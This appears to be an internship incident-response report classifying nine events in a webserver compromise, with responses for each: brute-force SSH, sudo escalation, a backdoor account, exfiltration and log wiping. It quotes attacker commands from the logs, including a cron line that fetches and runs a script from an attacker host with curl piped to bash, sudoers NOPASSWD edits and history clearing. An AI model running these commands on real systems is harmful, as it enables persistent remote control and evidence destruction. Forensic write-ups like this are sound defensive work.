# 🚨 Incident Classification & Response
### Case: webserver01 Compromise | 10 March 2024

---

## INC-001 — SSH Brute-Force Campaign
| Field | Details |
|---|---|
| **Severity** | 🟠 HIGH |
| **Priority** | P2 |
| **Time Window** | 10 Mar 03:14:02 – 03:38:21 |
| **Source IP** | 198.51.100.23 |
| **Target** | SSH port 22 — 40+ attempts against 20+ usernames |
| **Technique** | Dictionary / credential stuffing — automated username list |
| **Impact** | Noise, resource consumption; direct precursor to INC-002 |
| **Log Source** | auth.log |

**Immediate Response:**
- Block 198.51.100.23 at firewall/security group
- Enable fail2ban — ban after 5 failures within 60 seconds
- Alert SOC and add IP to threat feed

---

## INC-002 — Successful SSH Intrusion via "backup" Account
| Field | Details |
|---|---|
| **Severity** | 🔴 CRITICAL |
| **Priority** | P1 |
| **Time** | 10 Mar 03:45:16 |
| **Source IP** | 198.51.100.23 |
| **Method** | Password authentication — 8 failed attempts before success |
| **Account** | backup (service account — should not have password login) |
| **Session** | Session 925 opened |
| **Root Cause** | Service account had weak/guessable password + password auth enabled |
| **Impact** | Attacker gains interactive shell on production web server |
| **Log Source** | auth.log |

**Immediate Response:**
- Terminate active session immediately
- Lock backup account: `passwd -l backup`
- Block 198.51.100.23 at all network layers
- Escalate to Tier 2 SOC
- Enforce public-key only SSH for all service accounts

---

## INC-003 — Privilege Escalation to Root
| Field | Details |
|---|---|
| **Severity** | 🔴 CRITICAL |
| **Priority** | P1 |
| **Time** | 10 Mar 03:45:36 – 03:46:21 |
| **Commands** | sudo /usr/bin/id → sudo /usr/bin/cat /etc/sudoers → sudo /bin/bash |
| **Outcome** | Full root shell obtained — complete server control |
| **Root Cause** | "backup" service account had sudo privileges (misconfiguration) |
| **Impact** | Attacker can read, modify, or delete any file; install any software |
| **Log Source** | auth.log |

**Immediate Response:**
- Isolate server from network if possible
- Remove sudo from backup: `gpasswd -d backup sudo`
- Audit entire /etc/sudoers and /etc/sudoers.d/
- Apply principle of least privilege to all service accounts

---

## INC-004 — Backdoor Account "sysupdate" Created
| Field | Details |
|---|---|
| **Severity** | 🔴 CRITICAL |
| **Priority** | P1 |
| **Time** | 10 Mar 03:47:11 – 03:47:46 |
| **Commands** | useradd sysupdate; passwd sysupdate; usermod -aG sudo; NOPASSWD >> /etc/sudoers |
| **Account Created** | sysupdate (UID=1002, GID=1002) — passwordless root sudo |
| **Persistence Type** | Local backdoor account with permanent root access |
| **Impact** | Attacker retains root access even if "backup" account is secured |
| **Log Source** | auth.log |
| **Confirmed By** | INC-008 — attacker successfully returns via this account |

**Immediate Response:**
- Delete backdoor account: `userdel -r sysupdate`
- Revert /etc/sudoers to last known-good backup
- Alert on future useradd events via auditd
- Audit all accounts in /etc/passwd against approved baseline

---

## INC-005 — Malicious Cron Job / C2 Beacon Installed
| Field | Details |
|---|---|
| **Severity** | 🔴 CRITICAL |
| **Priority** | P1 |
| **Time Installed** | 03:48:26 (root crontab) |
| **Time Executing** | 03:20, 03:30, 03:40 (visible in syslog before intrusion confirmed) |
| **Cron Entry** | `*/10 * * * * curl -s http://192.0.2.99/update.sh \| bash` |
| **C2 Server** | 192.0.2.99 — attacker-controlled command-and-control |
| **Behaviour** | Every 10 minutes: downloads and executes remote script — arbitrary code execution |
| **Impact** | Active C2 channel — server under continuous remote attacker control |
| **Log Source** | auth.log (installation) + syslog (executions) |

**Immediate Response:**
- Remove cron entry: `crontab -r` (as root) or edit manually
- Block 192.0.2.99 at perimeter firewall: `iptables -A OUTPUT -d 192.0.2.99 -j DROP`
- Kill any active curl/bash processes
- Check /etc/cron.d, /etc/crontab, /var/spool/cron for additional entries
- Scan downloaded payloads from /tmp

---

## INC-006 — Data Staging & Exfiltration
| Field | Details |
|---|---|
| **Severity** | 🟠 HIGH |
| **Priority** | P1 |
| **Staging Time** | 03:23:10 |
| **Exfil Time** | 03:23:55 – 03:24:00 |
| **Staging Command** | `tar czf /tmp/.cache_bkp.tar.gz /var/www/html /etc/nginx` |
| **Destination** | 192.0.2.99:443 (confirmed by IPTABLES PSH+ACK + FIN logs) |
| **Data Stolen** | Web application source code + nginx server configuration |
| **Impact** | Intellectual property theft; nginx config may expose internal architecture and API endpoints |
| **Log Source** | syslog (EXECVE + IPTABLES-OUT) |

**Immediate Response:**
- Block 192.0.2.99 at all network layers immediately
- Preserve /tmp/.cache_bkp.tar.gz as forensic evidence (hash it first)
- Notify Data Protection Officer — potential data breach notification obligations
- Rotate all secrets, API keys, and credentials found in web app config and nginx
- Assess whether /etc/nginx contains backend service URLs or internal IP addresses

---

## INC-007 — Evidence Tampering (bash History Wiped)
| Field | Details |
|---|---|
| **Severity** | 🟡 MEDIUM |
| **Priority** | P2 |
| **Time** | 10 Mar 03:48:51 – 03:48:59 |
| **Commands** | `echo > /home/backup/.bash_history` and `history -c` |
| **Intent** | Destroy forensic record of all commands executed during the intrusion |
| **Impact** | Partial loss of forensic evidence — however auditd and syslog preserved key data |
| **Attacker Skill Level** | Indicates experienced attacker aware of defensive monitoring |
| **Log Source** | auth.log |

**Immediate Response:**
- Enable auditd EXECVE logging immediately if not already active
- Implement remote immutable syslog forwarding (SIEM)
- Recover any remaining session data from /proc or kernel audit logs
- Future: configure bash to log to remote server, not local history file

---

## INC-008 — Backdoor Re-Entry via "sysupdate"
| Field | Details |
|---|---|
| **Severity** | 🟠 HIGH |
| **Priority** | P1 |
| **Time** | 10 Mar 06:03:19 – 06:33:19 |
| **Account** | sysupdate from 198.51.100.23 |
| **Session Duration** | 30 minutes |
| **Log Visibility** | Limited — actions not fully captured (evidence tampering from Phase 5 may apply) |
| **Impact** | Confirms persistence mechanism working; 30-min session with limited visibility is high risk |
| **Log Source** | auth.log |

**Immediate Response:**
- Delete sysupdate account immediately
- Block 198.51.100.23 permanently
- Investigate what occurred during the 30-minute session
- Consider full server re-image as the safest remediation path

---

## INC-009 — Post-Compromise Probing
| Field | Details |
|---|---|
| **Severity** | 🟢 LOW |
| **Priority** | P3 |
| **Time** | 12:10 and 12:40 on 10 Mar |
| **Events** | Failed password for root (12:10) and admin (12:40) from 198.51.100.23 |
| **Assessment** | Continued reconnaissance — attacker testing direct root login availability |
| **Impact** | Low — failed attempts; monitoring continues |
| **Log Source** | auth.log |

---

*Classification by: Harmain Shah | Intern ID: CA0200 | Cryptonic Area Internship Program*
